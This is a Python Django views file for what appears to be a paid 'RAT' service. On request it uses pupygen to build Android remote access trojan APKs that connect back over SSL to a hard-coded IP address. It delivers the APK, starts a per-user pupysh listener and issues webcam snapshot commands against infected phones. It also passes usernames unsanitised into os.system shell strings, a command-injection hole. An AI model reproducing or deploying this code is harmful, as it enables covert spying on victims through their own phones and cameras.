from django.shortcuts import render, redirect,get_object_or_404
from RAT import models
from django.http import HttpResponse, HttpResponseRedirect
from django.views import generic
from django.template import loader
import os, errno
from django.contrib.auth import login, authenticate
from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse_lazy,reverse
from RAT.forms import SignUpForm
import subprocess
import gmplot
from django.http import JsonResponse



def add(request):
    credits = models.Credit.objects.get(user = request.user)
    if credits.number > 0:
        credits.number-=1
        credits.save()
        port = 6666+int(request.user.id)
        host='185.120.221.217:'+str(port)
        username = request.user.username
        dir = '/root/django/users/'+ str(username)+'/pupy/'+str(username)
        app = '/root/django/users/'+ str(username)+'/pupy/'+str(username)+'.apk'

        d=os.system('mkdir /root/django/users/'+ str(username))
        d=os.system('mkdir /root/django/users/'+ str(username)+'/pupy')
        c=os.system('cd /root/django/pupy/pupy ;./pupygen.py -O android -o '+ str(dir)+'.apk connect --host '+str(host)+' --transport ssl')
        if c == 0:
            c = "Your rat created in "+ str(dir)+".apk"
    ##down
        username = request.user.username
        file_path = app
        if os.path.exists(file_path):
            with open(file_path, 'rb') as fh:
                response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
                response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
                return response


    else:
        c = 'you dont have credit'
    # Render the HTML template index.html with the data in the context variable

    return render(
        request,
        'pupy/android/addrat.html',
        context={'c' : c
        },
    )



def down(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/pupy/'+str(username)+'.apk'
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response
    raise Http404

#///////////////// listeniing
def listen(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/pupy/'
    commandd = "tmux new-session -s "+str(username)+"-pupy"
    os.system('xterm -T "'+str(username)+'" -e '+str(commandd))
    return render(
        request,
        'pupy/android/listen.html',
        context={
        }
    )
def startlisten(request):
    username = request.user.username
    port = 6666+int(request.user.id)


    os.system('tmux send-keys -t '+str(username)+'-pupy "/root/django/pupy/pupy/pupysh.py -a ssl '+str(port)+'""\n"')

    return redirect('RAT:pupy/android/listen')

def webcamsnap(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/pupy/'

    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 1 -o '+str(dir)+'""\n"')
    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 2 -o '+str(dir)+'""\n"')

    return redirect('RAT:pupy/android/listen')
